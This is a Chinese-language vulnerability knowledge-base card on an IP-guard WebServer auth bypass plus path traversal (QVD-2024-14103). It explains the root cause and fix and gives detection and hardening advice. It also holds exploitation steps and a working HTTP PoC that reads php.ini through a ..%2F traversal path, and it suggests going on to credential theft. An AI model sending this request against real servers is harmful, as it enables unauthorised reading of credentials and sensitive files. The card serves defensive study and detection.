---
id: web-php-ipguard-mapplylist-getdatarecord-auth-bypass-file-read
title: IP-guard WebServer mApplyList 权限绕过 + 任意文件读取（QVD-2024-14103）：getdatarecord 分支跳过登录跳转，tempFile 路径穿越读文件
type: scenario
domain: web
path: web/php
technique: ipguard-getdatarecord-auth-bypass-path-traversal-read
tags:
- php
- ipguard
- auth-bypass
- path-traversal
- arbitrary-file-read
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V445
  verified_at: '2026-11-09T23:29:14+08:00'
  notes: 已对照原文与图01-09核对：downloadFile_client 取 path/filename/action、action=download 时 fopen(tempFile/..path) 并 print fread；未登录校验按 URL 最后一段取 func，getdatarecord 分支 errorresult 后仅 return 未 redirect，请求继续进入 action=download 分支；PoC（..%2F..%2F..%2FApache%2Fbin%2Fphp.ini）读取 php.ini、修复后 307 跳转、4.82.0607.0 的 realpath/stripos 目录限制均与截图一致。核对中修正：QVD-2024-14103 原被写入 cve 字段导致 kb validate 报 invalid CVE id，已移至标题/别名并把 cve 置空，validate 现为 0 error。未验证点：原文未给受影响版本区间（仅提及 4.82.0607.0 已修复），故未设置 affected_versions；未本机复现。
url: /docs/web/php/web-php-ipguard-mapplylist-getdatarecord-auth-bypass-file-read/
draft: false
kb_aliases:
- QVD-2024-14103
- IP-guard 权限绕过
- getdatarecord 绕过
- mApplyList 任意文件读取
- 下载接口路径穿越
---

## 一句话结论

未登录访问 IP-guard WebServer 的 `/ipg/appr/MApplyList/downloadFile_client/getdatarecord?path=..%2F..%2F..%2FApache%2Fbin%2Fphp.ini&filename=1&action=download` 时，控制器把 URL 最后一段解析为 `func`，而未登录校验里 `getdatarecord` 分支只记录错误日志就 `return`（缺少重定向），请求继续走 `download` 分支；`path` 又被直接拼成 `tempFile/{path}` 并 `fopen` 输出，形成未授权任意文件读取（QVD-2024-14103）。

## 原理

- 入口是移动网页应用接口 `application/controllers/appr/mApplyList.php` 的 `downloadFile_client()`。它从 `$_GET`/`$_POST` 取 `path`、`fileName`、`action`：`path="tempFile/".$path; $file_dir=$path;`，`action=download` 时 `fopen($file_dir,"rb")`，循环 `print fread()` 把文件内容写进响应（并设置 `Content-Disposition` 用 `filename` 作下载名）。
- 登录校验在同控制器的公共逻辑中：`$url=$_SERVER['REQUEST_URI']; $arrURL=parse_url($url); $func=strtolower(substr(strrchr(rtrim($arrURL['path'],'/'),'/'),1));`，即取最后一个 `/` 后的值作为 `func`。未登录时：若 `$func != 'download'`，则 `if ($func == 'getdatarecord') { $this->errorresult(...); return; } redirect("appr/SignIn"); return;`。
- 缺陷：`getdatarecord` 分支只记录未授权错误后 `return`，没有执行 `redirect`；这个 `return` 只结束校验函数，不会终止后续控制器逻辑，于是请求继续进入 `download` 分支——**校验存在但绕过了它自己的拦截动作**。
- 路径穿越：`tempFile` 位于 `TEC\WebServer\www\ipg\tempFile`，`path` 未过滤 `../`（URL 解码后 `..%2F..%2F..%2FApache%2Fbin%2Fphp.ini` 变成 `../../../Apache/bin/php.ini`），`fopen` 可读取 Web 根之外的文件；配合 `action=download` 直接输出。
- 修复：在 `getdatarecord` 分支补上 `redirect("appr/SignIn")`（复测变为 307 跳转）；4.82.0607.0 进一步对 `path` 做目录限制——用 `realpath`/`stripos($real_download_folder, $download_folder) !== 0` 确保下载目录仍在 `tempFile` 下（并 str_replace 分隔符），从而阻断路径穿越。

## 触发条件

- 目标运行未修复的 IP-guard WebServer（移动应用接口 `/ipg/appr/...` 可访问）；
- 攻击者能直接访问 Web 服务，无需任何登录凭据；
- 目标文件系统存在可读文件（如 `Apache/bin/php.ini`、配置文件、日志、源码）；
- Web 进程对目标文件有读权限（默认即可读 Web 目录及部分系统文件）。

## 利用步骤

1. 直接请求带 `getdatarecord` 后缀的 downloadFile_client 接口，确认返回 200 而非登录跳转（未修复时）。
2. 用 `path` 参数做目录穿越：`path=..%2F..%2F..%2FApache%2Fbin%2Fphp.ini`，`action=download`，`filename=1`。
3. 读取响应中的文件内容；替换 `path` 读取配置文件、数据库凭据、源码等。
4. 修复后接口返回 307 跳转登录页；可编写检测脚本请求 `/ipg/appr/MApplyList/downloadFile_client/getdatarecord` 看是否 200。

## PoC

```http
GET /ipg/appr/MApplyList/downloadFile_client/getdatarecord?path=..%2F..%2F..%2FApache%2Fbin%2Fphp.ini&filename=1&action=download HTTP/1.1
Host: 192.168.50.22
User-Agent: Mozilla/5.0
Connection: close
```

```text
未修复：HTTP/1.1 200，响应体为 php.ini 内容（原文截图成功读取 php.ini）
已修复：HTTP/1.1 307 Temporary Redirect，Location: /ipg/appr/SignIn
```

```python
# 检测脚本核心逻辑（原文）
import requests
def check(url):
    r = requests.get(f"{url}/ipg/appr/MApplyList/downloadFile_client/getdatarecord")
    return r.status_code == 200
```

## 变体与关联

- 变体：`func` 取 URL 最后一段的解析方式可用于其它“未登录时只记录不跳转”的分支；凡未登录逻辑里存在 `return` 但没有 `redirect/exit` 的路径都值得枚举。
- 变体：`path` 可读任意可读文件（Web 配置、数据库口令、日志、会话文件），进一步可用于凭据窃取/源码审计；与上传点组合可升级为 RCE。
- 关联：PHP 下载/删除接口的路径穿越见 [[web-php-zentao-backup-editor-arbitrary-file-delete]]、[[web-php-cmseasy-image-deleteimg-dir-traversal-file-delete]]；本卡核心是“鉴权分支 return 未阻断 + 下载路径穿越”的组合。
- 关联：同产品 flexpaper 命令注入 RCE 见 [[web-php-rce-ipguard-flexpaper-view-php-command-injection]]。

## 检测与防御

- 未登录分支必须 `redirect` 后 `exit/die`，不能只 `return`；所有敏感控制器在进入业务逻辑前统一强制鉴权（中间件/路由守卫），而不是在方法内零散判断。
- 下载接口对 `path` 做 `realpath` + 前缀校验（必须在 `tempFile` 白名单目录内），拒绝 `..`、绝对路径、编码分隔符；只允许按 ID 映射到固定文件名。
- 检测：请求 `/ipg/appr/MApplyList/downloadFile_client/getdatarecord` 且带 `path` 穿越的日志；响应 200 但未登录；下载响应中出现 `php.ini`/配置文件特征。
- 修复版本/补丁：确认升级到包含 `realpath` 目录限制的 4.82.0607.0 及以上（原文以该版本验证限制生效）。
